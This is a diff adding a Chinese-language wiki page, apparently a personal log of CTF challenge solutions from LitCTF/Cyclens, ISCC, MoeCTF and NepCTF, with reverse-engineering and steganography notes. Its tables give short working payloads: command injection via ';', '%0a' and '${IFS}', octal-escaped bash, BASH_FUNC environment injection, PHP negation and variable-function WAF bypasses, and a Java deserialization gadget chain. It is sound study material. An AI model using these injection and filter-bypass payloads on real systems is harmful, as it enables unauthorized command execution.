@@ -1,0 +1,22 @@
+{
+ "name": "其他赛事题解履历",
+ "title": "其他赛事题解履历",
+ "summary": "主平台之外的所有实战：LitCTF/Cyclens、ISCC、MoeCTF、NepCTF，以及逆向/固件/隐写专项。**每题一行，完整 writeup 在 `~/CTF/writeups/` 与博客。**",
+ "content": "# 其他赛事题解履历\n\n> 主平台之外的所有实战：LitCTF/Cyclens、ISCC、MoeCTF、NepCTF，以及逆向/固件/隐写专项。**每题一行，完整 writeup 在 `~/CTF/writeups/` 与博客。**\n\n## 一、LitCTF2026 / Cyclens（2026-07，16 题）\n\nRCELABS 系列（PHP 代码执行/命令注入闯关，难度递增）+ 数据泄露题：\n\n| 关卡 | 手法要点 |\n|---|---|\n| RCELABS 1/2/3 | `eval($_POST['a'])`、`?action=r`→`submit` 两步、`system($_POST['a'])`——直接命令执行 |\n| RCELABS 4 | ping 命令注入 `127.0.0.1;cat /flag` |\n| RCELABS 5/7 | 过滤空格 → `cat${IFS}/fl*`（`${IFS}`=空格，`*`=通配） |\n| RCELABS 6/9 | 全字符过滤 → **bashFuck 八进制**：`$'\\143\\141\\164' $'\\57\\146\\154\\141\\147'` |\n| RCELABS 8 | 输出被重定向 → `cat /flag > /tmp/x%0acat /tmp/x`（先落盘再读） |\n| RCELABS 14 | 参数名限长 7 字符 → 用数字参数名 `?1=cat /fl*` |\n| RCELABS 18 | `putenv` 环境变量注入 → `BASH_FUNC_echo%%=() { cat /flag; }` |\n| RCELABS 22 | 变量函数 `$_GET['a']($_GET['b'])` → `?a=system&b=cat%20/flag` |\n| lit_php_exec_functions | 随机执行函数（system/exec/…）→ `?action=r` 重置直到抽到 system |\n| lit_php_negation | WAF 拦字母数字 → **PHP 取反** `[~%8C%86…][!%FF]` |\n| lit_rce_with_includes | `eval(\"include(\".x.\");\")` → 直接 `c=system(\"cat /flag\")` |\n| .DS_Store 分片题 | `.DS_Store` 泄露隐藏目录 → 5 个 base64 分片合并 → gzip → flag |\n| Vim swap 题 | 删了 `flag.txt` 但 `.flag.txt.swp` 还在 → 交换文件里明文有 flag |\n\n另：全程用 Python `urllib` + 手动 PoW（无第三方库）；技巧总结：`${IFS}`、`*`、`%0a`、八进制、取反、变量函数、BASH_FUNC。\n（记录：`~/CTF/writeups/cyclens-litctf2026.md`；脚本 `~/CTF/scripts/cyclens/`）\n\n## 二、ISCC（2026-05）\n\n- **JWT 伪造**（弱密钥/算法混淆方向）\n- **PassKey 注册 TOCTOU**（时序竞态）\n- **Pwn 1-4**：`~/CTF/projects/ctf_iscc/`\n- 汇总进博客 2026 年 5 月综合 writeup\n\n## 三、MoeCTF2025（在青岑 PS70 打）\n\n| 题 | 手法要点 |\n|---|---|\n| 大结局 870（dog-app） | Java 反序列化：`HashSet<Dog> → Dog.hashCode → wagTail(TemplatesImpl,\"newTransformer\")`；**必须 JDK8** 生成 payload（serialVersionUID 对齐）；两容器共享网卡 → 内网 127.0.0.1 打；flag 在 `/proc/1/environ` |\n| 玄天手镯·万言启封咒 | jsjiami v5 混淆（字符串表 + RC4 解码 + 数组旋转 0x1c0）→ 解出 10000 字 → `POST /unseal` |\n| talent test（脚本目录 moectf/） | 见 `~/CTF/scripts/moectf/` |\n| 其余 | `~/CTF/scripts/moectf/`、`moectf_prompt/` |\n\n## 四、NepCTF / 其他探测\n\n- NepCTF：有过探测与脚本（`~/CTF/scripts/nepctf/`，含 session 记录），细节未归档\n- 博客还收录过：Northbridge SSRF Bypass、喵喵宠物医院 YAML 反序列化 RCE、HMAC 签名伪造等单点题（平台归属以博客原文为准）\n\n## 五、专项：逆向 / 固件 / 隐写\n\n| 专项 | 内容 |\n|---|---|\n| Godox / safecar | 车载/固件类目标的行为测试套件：CLV、hardcrash、隐藏路由、注入、jcenter、日志、多速度、方法枚举、模式、配对、追踪、TS 行为、类型混淆等（`~/CTF/scripts/godox/`）——特征是\"把设备当黑盒，穷举接口与行为\" |\n| 固件分析 | `~/CTF/scripts/firmware/`：签名扫描、隐写分析、AES/XOR 解密尝试链 |\n| Golden Spiral LSB（2026-09-04） | 斐波那契步进 LSB 隐写：`step=Fib(17)=1597`、`start=Fib(18)=2584`、RGB 轮转提取；R 通道先给的是\"红鲱鱼\"提示——**提示不一定就是答案**（`~/CTF/writeups/golden_spiral_lsb_writeup.md`） |\n| xor.exe（2026-06，Hermes 会话补齐） | PE flag-checker：objdump 定位 `movabs` 立即数逆推（→ [[逆向-算法识别与实战案例]] 案例 3）；收尾修正一处字节误读（`0x6d` / `0xd3`）后本地验证通过 |\n| plzdebugme（2026-06，Hermes 会话补齐） | Linux ELF 多层逆变（RC4→AES-128-ECB→BTEA→`x0r()`）：GDB `break x0r` 直读 BSS 中的 flag；writeup 见博客 re-plzdebugme |\n\n## 关联\n\n- [[0xGame2025-征战记录]] —— 规模最大的战役记录\n- [[青岑与CTFShow-题解履历]] —— 主平台题解\n- [[杂项-沙箱逃逸-PyJail与NodeJail]] —— Jail 与过滤对抗的对照页\n- [[Web-SSRF与XXE]] —— Northbridge / SSRF 场景\n- [[CTF博客-建设与部署]] —— writeup 全集入口\n- [[CTF-实战解题案例集]] —— 本页多数题目的\"卡点→证据→payload\"深度版\n\n## 存疑 / 矛盾\n\n- Cyclens 的 RCELABS-0 等个别关卡当时未留记录；以 `cyclens-litctf2026.md` 原文为准。\n- godox/safecar 与固件专项的最终结论未成文（脚本留在 `~/CTF/scripts/`），本页只记\"做过什么\"，不下结论。\n- xor.exe / plzdebugme 的**平台归属**在会话中未明说（xor.exe 关联本地 `rush_266` 包；与题集「266 Rush」的关系亦未明说）；以题面原文为准。两题详情见 [[会话全记录-Hermes的115次对话]] 线 1。\n\n## 来源\n\n- `~/CTF/writeups/` 全部文件 · 2026-10-03\n- 相关会话（2026-05 ～ 2026-09）\n",
+ "section": "project",
+ "group": "project",
+ "links": {
+  "internal": [
+   "0xGame2025-征战记录",
+   "CTF-实战解题案例集",
+   "CTF博客-建设与部署",
+   "Web-SSRF与XXE",
+   "杂项-沙箱逃逸-PyJail与NodeJail",
+   "逆向-算法识别与实战案例",
+   "青岑与CTFShow-题解履历"
+  ],
+  "unresolved": [
+   "会话全记录-Hermes的115次对话"
+  ]
+ }
+}
